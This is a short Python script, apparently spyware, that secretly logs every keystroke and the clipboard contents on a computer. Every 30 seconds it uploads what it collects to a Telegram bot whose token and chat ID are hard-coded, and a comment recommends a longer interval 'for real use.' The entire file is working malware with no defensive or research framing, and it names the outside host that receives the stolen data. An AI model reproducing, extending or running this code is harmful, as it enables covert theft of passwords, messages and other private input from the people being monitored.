import os, sys, time, threading, requests, pyperclip
from pynput import keyboard

# ==========================================
# CONFIGURATION
BOT_TOKEN = "8723448863:AAHrndQJbtHoDkw7GqavfCfqpp0bLSRLkwA"  # Tomar real token boshao
CHAT_ID = "5515529017"      # Tomar real chat id boshao
# ==========================================

API_FILE = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

# Global variables for storing data
log_buffer = []
clipboard_buffer = []
last_clip = ""

# Function to send logs to Telegram
def send_to_tg():
    global log_buffer, clipboard_buffer
    while True:
        # 30 seconds wait for testing. Change to 600 (10 mins) for real use.
        time.sleep(30) 
        
        if not log_buffer and not clipboard_buffer:
            continue

        # Collect all current logs
        keys_text = "".join(log_buffer)
        clips_text = "".join(clipboard_buffer)
        
        full_content = f"--- KEYLOGS ---\n{keys_text}\n\n--- CLIPBOARD ---\n{clips_text}"
        
        try:
            # Temporary file create kore send kora
            with open("sys_log.txt", "w", encoding="utf-8") as f:
                f.write(full_content)
            
            with open("sys_log.txt", "rb") as f:
                requests.post(API_FILE, data={"chat_id": CHAT_ID}, files={"document": f})
            
            # Data pathanor por buffer clear kora
            log_buffer.clear()
            clipboard_buffer.clear()
            os.remove("sys_log.txt")
        except Exception as e:
            print(f"Error sending to TG: {e}")

# Keyboard event handler
def on_press(key):
    try:
        # Normal characters
        log_buffer.append(key.char)
    except AttributeError:
        # Special keys
        if key == keyboard.Key.space:
            log_buffer.append(" ")
        elif key == keyboard.Key.enter:
            log_buffer.append("\n")
        else:
            log_buffer.append(f" [{key}] ")

# Clipboard monitoring function
def check_clipboard():
    global last_clip
    while True:
        try:
            current_clip = pyperclip.paste()
            if current_clip != last_clip:
                clipboard_buffer.append(f"[{time.ctime()}] {current_clip}\n")
                last_clip = current_clip
        except:
            pass
        time.sleep(5)

if __name__ == "__main__":
    # Thread 1: Send logs to Telegram every 30 seconds
    tg_thread = threading.Thread(target=send_to_tg, daemon=True)
    tg_thread.start()

    # Thread 2: Monitor clipboard every 5 seconds
    clip_thread = threading.Thread(target=check_clipboard, daemon=True)
    clip_thread.start()

    # Main thread: Keyboard listener (this blocks the main thread)
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()